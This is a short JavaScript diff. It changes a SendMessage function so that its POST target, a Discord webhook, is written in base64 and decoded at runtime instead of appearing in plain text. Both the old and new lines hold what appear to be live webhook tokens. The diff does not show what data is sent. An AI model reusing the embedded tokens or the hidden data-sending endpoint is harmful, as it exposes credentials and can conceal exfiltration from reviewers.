@@ -112,8 +112,11 @@ function SessionStorage(action, key, value) {
 
 function SendMessage(msg) {
 
+    //var encodedStringBtoA = btoa('link');
+    //console.log(encodedStringBtoA);
+
     const request = new XMLHttpRequest();
-    request.open("POST", "https://discord.com/api/webhooks/1349802165924925440/SLrme92uLrQ7jSO-YwFw8A_LmOL3TcM45zBty_QNRBw6_rnSnZTvFmK_Z1i_WmXujmgr");
+    request.open("POST", atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2NTAxMDUwMzQzMjI3NDA0NC9IZFUwM2MxZGVIS2dqd0s4SFlPcWF6V25GSzR3Z3BhR2lRNG1GV0dNc09UWXlnRlVvSVltRFNRZ1NGZ0xzSENOVnFTNQ=="));
 
     request.setRequestHeader('Content-type', 'application/json');
 
